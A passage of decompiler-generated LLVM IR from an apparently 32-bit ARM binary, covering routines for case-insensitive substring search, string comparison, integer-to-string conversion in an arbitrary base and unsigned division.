  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_113cc, { 7, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_115e4, { 23, 24, 21, 22, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1065c, { 1, 0 }
}

define i32 @function_10668(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10668:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_1066c = load i8, i8* %tmp, align 1
  %v2_10670 = icmp eq i8 %v3_1066c, 0
  br i1 %v2_10670, label %bb, label %dec_label_pc_10684

bb:                                               ; preds = %dec_label_pc_10668
  %v4_1066c = zext i8 %v3_1066c to i32
  br label %dec_label_pc_10698

dec_label_pc_10684:                               ; preds = %dec_label_pc_10668
  br label %dec_label_pc_10688

dec_label_pc_10688:                               ; preds = %dec_label_pc_10688, %dec_label_pc_10684
  %v0_10688 = phi i32 [ %v1_10688, %dec_label_pc_10688 ], [ 0, %dec_label_pc_10684 ]
  %v1_10688 = add i32 %v0_10688, 1
  %v2_1068c = add i32 %v1_10688, %arg2
  %v3_1068c = inttoptr i32 %v2_1068c to i8*
  %v4_1068c = load i8, i8* %v3_1068c, align 1
  %v2_10690 = icmp eq i8 %v4_1068c, 0
  br i1 %v2_10690, label %dec_label_pc_10698, label %dec_label_pc_10688

dec_label_pc_10698:                               ; preds = %dec_label_pc_10688, %bb
  %v0_106dc21 = phi i32 [ %v4_1066c, %bb ], [ %v1_10688, %dec_label_pc_10688 ]
  %v0_106a02 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_106a02, 1
  br i1 %tmp29, label %dec_label_pc_106f0, label %dec_label_pc_106ac

dec_label_pc_106ac:                               ; preds = %dec_label_pc_10698, %dec_label_pc_106a0.backedge
  %v0_106a4.in = phi i32 [ %v0_106a4, %dec_label_pc_106a0.backedge ], [ %v0_106a02, %dec_label_pc_10698 ]
  %v1_106b8 = phi i32 [ %v1_106b815, %dec_label_pc_106a0.backedge ], [ 0, %dec_label_pc_10698 ]
  %v0_106ac = phi i32 [ %v5_106ac, %dec_label_pc_106a0.backedge ], [ %tmp23, %dec_label_pc_10698 ]
  %v0_106a4 = add i32 %v0_106a4.in, -1
  %v1_106ac = inttoptr i32 %v0_106ac to i8*
  %v2_106ac = load i8, i8* %v1_106ac, align 1
  %v3_106ac = zext i8 %v2_106ac to i32
  %v5_106ac = add i32 %v0_106ac, 1
  %v1_106b0 = add nsw i32 %v3_106ac, -65
  %v2_106b8 = add i32 %v1_106b8, %arg2
  %v3_106b8 = inttoptr i32 %v2_106b8 to i8*
  %v4_106b8 = load i8, i8* %v3_106b8, align 1
  %v6_106b8 = zext i8 %v4_106b8 to i32
  %v1_106bc = add nsw i32 %v6_106b8, -65
  %tmp38 = icmp ult i32 %v1_106b0, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_106ac
  %v5_106c0 = or i32 %v3_106ac, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_106ac, %bb30
  %v0_106cc = phi i32 [ %v3_106ac, %dec_label_pc_106ac ], [ %v5_106c0, %bb30 ]
  %tmp39 = icmp ult i32 %v1_106bc, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_106c8 = or i32 %v6_106b8, 96
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_106cc = phi i32 [ %v6_106b8, %bb31 ], [ %v5_106c8, %bb32 ]
  %v9_106cc = icmp eq i32 %v0_106cc, %v1_106cc
  br i1 %v9_106cc, label %dec_label_pc_106d8, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_106a0.backedge

dec_label_pc_106a0.backedge:                      ; preds = %bb34, %dec_label_pc_106d8
  %v1_106b815 = phi i32 [ 0, %bb34 ], [ %v1_106d8, %dec_label_pc_106d8 ]
  %tmp35 = icmp slt i32 %v0_106a4, 1
  br i1 %tmp35, label %dec_label_pc_106f0, label %dec_label_pc_106ac

dec_label_pc_106d8:                               ; preds = %bb33
  %v1_106d8 = add i32 %v1_106b8, 1
  %v9_106dc = icmp eq i32 %v0_106dc21, %v1_106d8
  br i1 %v9_106dc, label %dec_label_pc_106e4, label %dec_label_pc_106a0.backedge

dec_label_pc_106e4:                               ; preds = %dec_label_pc_106d8
  %v2_106e4 = sub i32 %v5_106ac, %tmp23
  br label %dec_label_pc_106f0

dec_label_pc_106f0:                               ; preds = %dec_label_pc_106a0.backedge, %dec_label_pc_10698, %dec_label_pc_106e4
  %storemerge = phi i32 [ %v2_106e4, %dec_label_pc_106e4 ], [ -1, %dec_label_pc_10698 ], [ -1, %dec_label_pc_106a0.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_106d8, { 1, 0 }
  uselistorder i32 %v0_106ac, { 1, 0 }
  uselistorder i32 %v1_106b8, { 1, 0 }
  uselistorder i8 %v3_1066c, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_106f0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106a0.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_106ac, { 1, 0 }
}

define i32 @function_106f8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_106f8:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_106f8 = load i8, i8* %arg1, align 1
  %v2_106fc = icmp eq i8 %v2_106f8, 0
  br i1 %v2_106fc, label %bb, label %dec_label_pc_10708

bb:                                               ; preds = %dec_label_pc_106f8
  %v3_106f8 = zext i8 %v2_106f8 to i32
  br label %dec_label_pc_1071c

dec_label_pc_10708:                               ; preds = %dec_label_pc_106f8
  br label %dec_label_pc_1070c

dec_label_pc_1070c:                               ; preds = %dec_label_pc_1070c, %dec_label_pc_10708
  %v0_1070c = phi i32 [ %v1_1070c, %dec_label_pc_1070c ], [ 0, %dec_label_pc_10708 ]
  %v1_1070c = add i32 %v0_1070c, 1
  %v2_10710 = add i32 %v1_1070c, %tmp
  %v3_10710 = inttoptr i32 %v2_10710 to i8*
  %v4_10710 = load i8, i8* %v3_10710, align 1
  %v2_10714 = icmp eq i8 %v4_10710, 0
  br i1 %v2_10714, label %dec_label_pc_1071c, label %dec_label_pc_1070c

dec_label_pc_1071c:                               ; preds = %dec_label_pc_1070c, %bb
  %v0_107683 = phi i32 [ %v3_106f8, %bb ], [ %v1_1070c, %dec_label_pc_1070c ]
  %v1_1071c = inttoptr i32 %arg2 to i8*
  %v2_1071c = load i8, i8* %v1_1071c, align 1
  %v3_1071c = zext i8 %v2_1071c to i32
  store i32 %v3_1071c, i32* @r3, align 4
  %v2_10720 = icmp eq i8 %v2_1071c, 0
  br i1 %v2_10720, label %bb21, label %dec_label_pc_1072c

bb21:                                             ; preds = %dec_label_pc_1071c
  store i32 %v3_1071c, i32* @r2, align 4
  br label %dec_label_pc_10740

dec_label_pc_1072c:                               ; preds = %dec_label_pc_1071c
  br label %dec_label_pc_10730

dec_label_pc_10730:                               ; preds = %dec_label_pc_10730, %dec_label_pc_1072c
  %v0_10730 = phi i32 [ %v1_10730, %dec_label_pc_10730 ], [ 0, %dec_label_pc_1072c ]
  %v1_10730 = add i32 %v0_10730, 1
  store i32 %v1_10730, i32* @r2, align 4
  %v2_10734 = add i32 %v1_10730, %arg2
  %v3_10734 = inttoptr i32 %v2_10734 to i8*
  %v4_10734 = load i8, i8* %v3_10734, align 1
  %v6_10734 = zext i8 %v4_10734 to i32
  store i32 %v6_10734, i32* @r3, align 4
  %v2_10738 = icmp eq i8 %v4_10734, 0
  br i1 %v2_10738, label %dec_label_pc_10740, label %dec_label_pc_10730

dec_label_pc_10740:                               ; preds = %dec_label_pc_10730, %bb21
  %v0_10740 = phi i32 [ %v3_1071c, %bb21 ], [ %v1_10730, %dec_label_pc_10730 ]
  %v9_10740 = icmp eq i32 %v0_10740, %v0_107683
  br i1 %v9_10740, label %dec_label_pc_10768.preheader, label %dec_label_pc_10748

dec_label_pc_10768.preheader:                     ; preds = %dec_label_pc_10740
  %v2_107685 = icmp eq i32 %v0_107683, 0
  br i1 %v2_107685, label %dec_label_pc_10770, label %dec_label_pc_10750

dec_label_pc_10748:                               ; preds = %dec_label_pc_10750, %dec_label_pc_10740
  ret i32 0

dec_label_pc_10750:                               ; preds = %dec_label_pc_10760, %dec_label_pc_10768.preheader
  %v0_10768.in = phi i32 [ %v0_10768, %dec_label_pc_10760 ], [ %v0_107683, %dec_label_pc_10768.preheader ]
  %v0_10764 = phi i32 [ %v1_10764, %dec_label_pc_10760 ], [ %arg2, %dec_label_pc_10768.preheader ]
  %v0_10760 = phi i32 [ %v1_10760, %dec_label_pc_10760 ], [ %tmp, %dec_label_pc_10768.preheader ]
  %v0_10768 = add i32 %v0_10768.in, -1
  %v1_10750 = inttoptr i32 %v0_10760 to i8*
  %v2_10750 = load i8, i8* %v1_10750, align 1
  %v3_10750 = zext i8 %v2_10750 to i32
  store i32 %v3_10750, i32* @r2, align 4
  %v1_10754 = inttoptr i32 %v0_10764 to i8*
  %v2_10754 = load i8, i8* %v1_10754, align 1
  %v3_10754 = zext i8 %v2_10754 to i32
  store i32 %v3_10754, i32* @r3, align 4
  %v9_10758 = icmp eq i8 %v2_10750, %v2_10754
  br i1 %v9_10758, label %dec_label_pc_10760, label %dec_label_pc_10748

dec_label_pc_10760:                               ; preds = %dec_label_pc_10750
  %v1_10760 = add i32 %v0_10760, 1
  %v1_10764 = add i32 %v0_10764, 1
  %v2_10768 = icmp eq i32 %v0_10768, 0
  br i1 %v2_10768, label %dec_label_pc_10770, label %dec_label_pc_10750

dec_label_pc_10770:                               ; preds = %dec_label_pc_10760, %dec_label_pc_10768.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10730, { 0, 1, 3, 2 }
  uselistorder i8 %v2_106f8, { 1, 0 }
}

define i32 @function_10778(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10778:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v3_10778 = load i32, i32* @r4, align 4
  %v12_10778 = load i32, i32* @r7, align 4
  %v0_1077c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1077c, i32* %r8.global-to-local, align 4
  %v2_1077c = icmp eq i32 %v0_1077c, 0
  store i1 %v2_1077c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_1077c, label %dec_label_pc_1085c, label %dec_label_pc_1078c

dec_label_pc_1078c:                               ; preds = %dec_label_pc_10778
  %v3_1078c = icmp eq i8 %arg1, 0
  store i1 %v3_1078c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1078c, label %.thread, label %dec_label_pc_107a0

.thread:                                          ; preds = %dec_label_pc_1078c
  %v4_10794 = inttoptr i32 %v0_1077c to i8*
  store i8 48, i8* %v4_10794, align 1
  %v0_10798.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10798.pr.pr, label %.thread1, label %dec_label_pc_107a0

.thread1:                                         ; preds = %.thread
  %v4_10798 = load i32, i32* %r8.global-to-local, align 4
  %v5_10798 = add i32 %v4_10798, 1
  %v6_10798 = inttoptr i32 %v5_10798 to i8*
  store i8 0, i8* %v6_10798, align 1
  %v0_1079c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1079c.pr.pr, label %dec_label_pc_1085c, label %dec_label_pc_107a0

dec_label_pc_107a0:                               ; preds = %dec_label_pc_1078c, %.thread, %.thread1
  %tmp47 = icmp slt i8 %arg1, 0
  %v7_107a4 = icmp eq i32 %arg2, 10
  store i1 %v7_107a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_107a4, label %bb, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_107a0
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_107a0
  %v4_107a0 = zext i1 %tmp47 to i32
  store i32 %v4_107a0, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp47, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_107c48 = sub nsw i32 0, %tmp
  %tmp.v3_107c48 = select i1 %phitmp, i32 %tmp, i32 %v3_107c48
  %tmp46 = zext i1 %phitmp to i32
  %. = xor i32 %tmp46, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread28
  %storemerge30 = phi i32 [ %tmp, %.thread28 ], [ %tmp.v3_107c48, %bb ]
  %storemerge = phi i32 [ 0, %.thread28 ], [ %., %bb ]
  store i32 %storemerge30, i32* @r4, align 4
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_107d0 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_107d0, i32* @r7, align 4
  br label %dec_label_pc_107d4

dec_label_pc_107d4:                               ; preds = %bb45, %.thread6
  %v0_107d4 = phi i32 [ %v0_107f8, %bb45 ], [ %storemerge30, %.thread6 ]
  store i32 %v0_107d4, i32* %r0.global-to-local, align 4
  %v0_107d8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_107d8, i32* %r1.global-to-local, align 4
  %sext = mul i32 %v0_107d4, 16777216
  %v1_107dc = sdiv i32 %sext, 16777216
  %v3_107dc = call i32 @function_10970(i32 %v1_107dc, i32 %v0_107d8)
  %v7_107e0 = icmp eq i32 %v0_107d8, 9
  store i1 %v7_107e0, i1* %cpsr_z.global-to-local, align 1
  %v1_107e4 = add i32 %v0_107d8, 48
  %v0_107e8 = load i32, i32* @r4, align 4
  store i32 %v0_107e8, i32* @r0, align 4
  %v7_107ec = icmp sgt i32 %v0_107d8, 9
  %extract.t = trunc i32 %v1_107e4 to i8
  br i1 %v7_107ec, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_107d4
  %v9_107ec = add i32 %v0_107d8, 55
  %extract.t27 = trunc i32 %v9_107ec to i8
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_107d4, %bb44
  %v0_107f4.off0 = phi i8 [ %extract.t, %dec_label_pc_107d4 ], [ %extract.t27, %bb44 ]
  %v0_107f0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_107f0, i32* @r1, align 4
  %v2_107f4 = load i32, i32* %r5.global-to-local, align 4
  %v3_107f4 = load i32, i32* @r7, align 4
  %v4_107f4 = add i32 %v3_107f4, %v2_107f4
  %v5_107f4 = inttoptr i32 %v4_107f4 to i8*
  store i8 %v0_107f4.off0, i8* %v5_107f4, align 1
  %v0_107f8 = call i32 @function_10874()
  store i32 %v0_107f8, i32* %r0.global-to-local, align 4
  store i32 %v0_107f8, i32* @r4, align 4
  %v2_107fc = icmp eq i32 %v0_107f8, 0
  store i1 %v2_107fc, i1* %cpsr_z.global-to-local, align 1
  %v0_10800 = load i32, i32* %r5.global-to-local, align 4
  %v1_10800 = add i32 %v0_10800, -1
  store i32 %v1_10800, i32* %r5.global-to-local, align 4
  br i1 %v2_107fc, label %dec_label_pc_10808, label %dec_label_pc_107d4

dec_label_pc_10808:                               ; preds = %bb45
  %v0_10808 = load i32, i32* %sl.global-to-local, align 4
  %v2_10808 = icmp eq i32 %v0_10808, 0
  store i1 %v2_10808, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10808, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_10808
  %v3_1080c = ptrtoint i32* %stack_var_-32 to i32
  %v3_10810 = add i32 %v1_10800, %v3_1080c
  store i32 %v3_10810, i32* %r2.global-to-local, align 4
  %v4_10818 = add i32 %v3_10810, -34
  %v5_10818 = inttoptr i32 %v4_10818 to i8*
  store i8 45, i8* %v5_10818, align 1
  %v0_1081c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_1081c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_1081c.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_10808
  %v1_1081c = phi i32 [ %v1_10800, %dec_label_pc_10808 ], [ %v1_1081c.pre, %.thread11 ]
  %v2_1081c = add i32 %v1_1081c, 1
  store i32 %v2_1081c, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_10828 = phi i32 [ %v2_1081c, %.thread12 ], [ %v1_1081c.pre, %.thread11 ]
  %v0_10820 = load i32, i32* @r7, align 4
  %v2_10820 = add i32 %v0_10820, %v1_10828
  %v3_10820 = inttoptr i32 %v2_10820 to i8*
  %v4_10820 = load i8, i8* %v3_10820, align 1
  %v6_10820 = zext i8 %v4_10820 to i32
  %v2_10824 = icmp eq i8 %v4_10820, 0
  store i1 %v2_10824, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_10820, i32* %r2.global-to-local, align 4
  br i1 %v2_10824, label %dec_label_pc_1086c, label %dec_label_pc_10834.preheader

dec_label_pc_10834.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10834

dec_label_pc_10834:                               ; preds = %dec_label_pc_10834.preheader, %dec_label_pc_10834
  %v0_10834 = phi i32 [ 0, %dec_label_pc_10834.preheader ], [ %v1_10834, %dec_label_pc_10834 ]
  %v1_10834 = add i32 %v0_10834, 1
  store i32 %v1_10834, i32* %r1.global-to-local, align 4
  %v2_10838 = add i32 %v1_10834, %v2_10820
  %v3_10838 = inttoptr i32 %v2_10838 to i8*
  %v4_10838 = load i8, i8* %v3_10838, align 1
  %v2_1083c = icmp eq i8 %v4_10838, 0
  store i1 %v2_1083c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1083c, label %dec_label_pc_10844, label %dec_label_pc_10834

dec_label_pc_10844:                               ; preds = %dec_label_pc_10834, %dec_label_pc_1086c
  %v0_1084824 = phi i32 [ %v6_10820, %dec_label_pc_1086c ], [ %v1_10834, %dec_label_pc_10834 ]
  %v0_10844 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10844, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10848

dec_label_pc_10848:                               ; preds = %dec_label_pc_10848.dec_label_pc_10848_crit_edge, %dec_label_pc_10844
  %v2_10854 = phi i32 [ %v5_10854, %dec_label_pc_10848.dec_label_pc_10848_crit_edge ], [ %v0_10844, %dec_label_pc_10844 ]
  %v0_1084c = phi i32 [ %v0_1084c.pre, %dec_label_pc_10848.dec_label_pc_10848_crit_edge ], [ %v2_10820, %dec_label_pc_10844 ]
  %v0_10848 = phi i32 [ %v0_10848.pre, %dec_label_pc_10848.dec_label_pc_10848_crit_edge ], [ %v0_1084824, %dec_label_pc_10844 ]
  %v1_10848 = add i32 %v0_10848, -1
  store i32 %v1_10848, i32* %r1.global-to-local, align 4
  %v1_1084c = inttoptr i32 %v0_1084c to i8*
  %v2_1084c = load i8, i8* %v1_1084c, align 1
  %v5_1084c = add i32 %v0_1084c, 1
  store i32 %v5_1084c, i32* %r2.global-to-local, align 4
  %v3_10850 = icmp eq i32 %v0_10848, 0
  store i1 %v3_10850, i1* %cpsr_z.global-to-local, align 1
  %v3_10854 = inttoptr i32 %v2_10854 to i8*
  store i8 %v2_1084c, i8* %v3_10854, align 1
  %v4_10854 = load i32, i32* %r0.global-to-local, align 4
  %v5_10854 = add i32 %v4_10854, 1
  store i32 %v5_10854, i32* %r0.global-to-local, align 4
  br i1 %v3_10850, label %dec_label_pc_1085c, label %dec_label_pc_10848.dec_label_pc_10848_crit_edge

dec_label_pc_10848.dec_label_pc_10848_crit_edge:  ; preds = %dec_label_pc_10848
  %v0_10848.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_1084c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10848

dec_label_pc_1085c:                               ; preds = %dec_label_pc_10848, %.thread1, %dec_label_pc_10778
  %v0_1085c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1085c, i32* %r0.global-to-local, align 4
  store i32 %v3_10778, i32* @r4, align 4
  store i32 %v12_10778, i32* @r7, align 4
  ret i32 %v0_1085c

dec_label_pc_1086c:                               ; preds = %.thread11._crit_edge
  store i32 %v6_10820, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10844

; uselistorder directives
  uselistorder i32 %v5_10854, { 1, 0 }
  uselistorder i1 %v3_10850, { 1, 0 }
  uselistorder i32 %v0_1084c, { 1, 0 }
  uselistorder i32 %v1_10834, { 0, 1, 3, 2 }
  uselistorder i32 %v6_10820, { 1, 0 }
  uselistorder i32 %v2_10820, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1081c.pre, { 1, 0 }
  uselistorder i32 %v1_10800, { 1, 0, 2 }
  uselistorder i32 %v0_107f8, { 1, 2, 3, 0 }
  uselistorder i32 %v0_107d8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_1077c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 13, 8, 10, 9, 11, 12 }
  uselistorder i32 55, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_10844, { 1, 0 }
  uselistorder label %dec_label_pc_10834, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_107a0, { 2, 1, 0 }
}

define i32 @function_10874() local_unnamed_addr {
dec_label_pc_10874:
  %r2.global-to-local = alloca i32, align 4
  %v0_10874 = load i32, i32* @r1, align 4
  %v1_10874 = add i32 %v0_10874, -1
  store i32 %v1_10874, i32* %r2.global-to-local, align 4
  %v2_10874 = icmp eq i32 %v0_10874, 0
  %v7_10874 = icmp eq i32 %v0_10874, 1
  %v0_10878 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_10874, i32 %v0_10878)
  br i1 %v2_10874, label %dec_label_pc_1095c, label %dec_label_pc_10880

dec_label_pc_10880:                               ; preds = %dec_label_pc_10874
  %v0_10880 = load i32, i32* @r0, align 4
  %v1_10880 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_10880, %v1_10880
  br i1 %tmp, label %dec_label_pc_10888, label %dec_label_pc_10914

dec_label_pc_10888:                               ; preds = %dec_label_pc_10880
  %v1_10888 = load i32, i32* %r2.global-to-local, align 4
  %v2_10888 = and i32 %v1_10888, %v1_10880
  %v4_10888 = icmp eq i32 %v2_10888, 0
  br i1 %v4_10888, label %dec_label_pc_10920, label %dec_label_pc_10890

dec_label_pc_10890:                               ; preds = %dec_label_pc_10888
  %v3_10890 = icmp ult i32 %v1_10880, 536870912
  br i1 %v3_10890, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_10890
  %v4_10894 = mul i32 %v1_10880, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_10890, %.thread
  %v0_108b4.pr36.ph = phi i32 [ %v4_10894, %.thread ], [ %v1_10880, %dec_label_pc_10890 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_10890 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_108b4.pr36 = phi i32 [ %v4_108a8, %bb81 ], [ %v0_108b4.pr36.ph, %.preheader.preheader ]
  %v1_108ac = phi i32 [ %v4_108ac, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_108a0 = icmp ugt i32 %v0_108b4.pr36, 268435455
  br i1 %v2_108a0, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_108b4thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_108a4 = icmp ult i32 %v0_108b4.pr36, %v0_10880
  br i1 %v4_108a4, label %bb80, label %dec_label_pc_108b4thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_108a8 = and i32 %v0_108b4.pr36, 268435456
  %v3_108a8 = icmp eq i32 %v2_108a8, 0
  %v4_108a8 = mul i32 %v0_108b4.pr36, 16
  br i1 %v3_108a8, label %bb81, label %dec_label_pc_108b4.loopexit

bb81:                                             ; preds = %bb80
  %v2_108ac = and i32 %v1_108ac, 268435456
  %v3_108ac = icmp eq i32 %v2_108ac, 0
  %v4_108ac = mul i32 %v1_108ac, 16
  br i1 %v3_108ac, label %.preheader, label %dec_label_pc_108b4thread-pre-split.loopexit.loopexit

dec_label_pc_108b4thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_108c048.ph = phi i32 [ %v1_108ac, %bb ], [ %v4_108ac, %bb81 ]
  %v0_108b4.pr38.ph = phi i32 [ %v0_108b4.pr36, %bb ], [ %v4_108a8, %bb81 ]
  br label %dec_label_pc_108b4thread-pre-split.loopexit

dec_label_pc_108b4thread-pre-split.loopexit:      ; preds = %dec_label_pc_108b4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_108c048 = phi i32 [ %v1_108ac, %.thread2 ], [ %v1_108c048.ph, %dec_label_pc_108b4thread-pre-split.loopexit.loopexit ]
  %v0_108b4.pr38 = phi i32 [ %v0_108b4.pr36, %.thread2 ], [ %v0_108b4.pr38.ph, %dec_label_pc_108b4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_108b4thread-pre-split

dec_label_pc_108b4thread-pre-split:               ; preds = %dec_label_pc_108b4thread-pre-split.loopexit, %bb83
  %v1_108c046 = phi i32 [ %v1_108c048, %dec_label_pc_108b4thread-pre-split.loopexit ], [ %v3_108c0, %bb83 ]
  %v0_108b4.pr = phi i32 [ %v0_108b4.pr38, %dec_label_pc_108b4thread-pre-split.loopexit ], [ %v3_108bc, %bb83 ]
  br label %dec_label_pc_108b4

dec_label_pc_108b4.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_108b4

dec_label_pc_108b4:                               ; preds = %dec_label_pc_108b4.loopexit, %dec_label_pc_108b4thread-pre-split
  %v1_108c0 = phi i32 [ %v1_108c046, %dec_label_pc_108b4thread-pre-split ], [ %v1_108ac, %dec_label_pc_108b4.loopexit ]
  %v1_108bc = phi i32 [ %v0_108b4.pr, %dec_label_pc_108b4thread-pre-split ], [ %v4_108a8, %dec_label_pc_108b4.loopexit ]
  %v2_108b4 = icmp slt i32 %v1_108bc, 0
  br i1 %v2_108b4, label %dec_label_pc_108c8, label %bb82

bb82:                                             ; preds = %dec_label_pc_108b4
  %v4_108b8 = icmp ult i32 %v1_108bc, %v0_10880
  br i1 %v4_108b8, label %bb83, label %dec_label_pc_108c8

bb83:                                             ; preds = %bb82
  %v3_108bc = mul i32 %v1_108bc, 2
  %v2_108c0 = icmp slt i32 %v1_108c0, 0
  %v3_108c0 = mul i32 %v1_108c0, 2
  br i1 %v2_108c0, label %dec_label_pc_108c8, label %dec_label_pc_108b4thread-pre-split

dec_label_pc_108c8:                               ; preds = %bb82, %dec_label_pc_108b4, %bb83
  %v2_108d459 = phi i32 [ %v3_108c0, %bb83 ], [ %v1_108c0, %bb82 ], [ %v1_108c0, %dec_label_pc_108b4 ]
  %v1_108cc51 = phi i32 [ %v3_108bc, %bb83 ], [ %v1_108bc, %bb82 ], [ %v1_108bc, %dec_label_pc_108b4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_108cc

dec_label_pc_108cc:                               ; preds = %.thread11, %dec_label_pc_108c8
  %v1_10900 = phi i32 [ %v4_10900, %.thread11 ], [ %v2_108d459, %dec_label_pc_108c8 ]
  %v1_108d4 = phi i32 [ %v0_1090c, %.thread11 ], [ 0, %dec_label_pc_108c8 ]
  %v1_10904 = phi i32 [ %v4_10904, %.thread11 ], [ %v1_108cc51, %dec_label_pc_108c8 ]
  %v1_108d0 = phi i32 [ %v0_108fc, %.thread11 ], [ %v0_10880, %dec_label_pc_108c8 ]
  %v3_108cc = icmp ult i32 %v1_108d0, %v1_10904
  br i1 %v3_108cc, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_108cc
  %v3_108d0 = sub i32 %v1_108d0, %v1_10904
  %v3_108d4 = or i32 %v1_108d4, %v1_10900
  store i32 %v3_108d4, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_108cc, %bb84
  %v1_108dc = phi i32 [ %v1_108d0, %dec_label_pc_108cc ], [ %v3_108d0, %bb84 ]
